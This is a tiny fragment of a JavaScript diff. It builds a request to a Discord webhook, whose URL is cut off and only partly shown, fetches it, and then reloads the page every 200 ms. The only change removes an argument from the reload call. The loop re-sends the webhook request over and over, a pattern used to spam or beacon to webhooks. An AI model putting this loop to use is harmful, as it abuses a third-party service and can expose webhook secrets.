@@ -11,4 +11,4 @@ const myRequest = new Request("https://discord.com/api/webhooks/1153051796634337
       }
 
 fetch(myRequest)
-sleep(200).then(() => { document.location.reload(myRequest); });
+sleep(200).then(() => { document.location.reload(); });
